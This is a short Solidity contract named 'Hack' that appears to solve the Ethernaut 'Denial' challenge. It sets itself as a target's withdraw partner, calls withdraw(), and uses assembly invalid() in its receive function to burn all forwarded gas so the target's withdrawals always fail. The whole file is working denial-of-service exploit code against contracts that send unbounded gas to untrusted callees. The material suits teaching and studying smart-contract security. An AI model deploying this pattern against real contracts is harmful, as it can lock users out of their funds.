// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDenial{
    function setWithdrawPartner(address _partner) external;
     function withdraw() external;
}

contract Hack{

    IDenial private _Code;
    constructor(address _address){
        _Code=IDenial(_address);
    }
    function attack()external{
        _Code.setWithdrawPartner(address(this));
        _Code.withdraw();
    }
    receive() external payable {
        assembly{
            invalid()
        }
     }
}
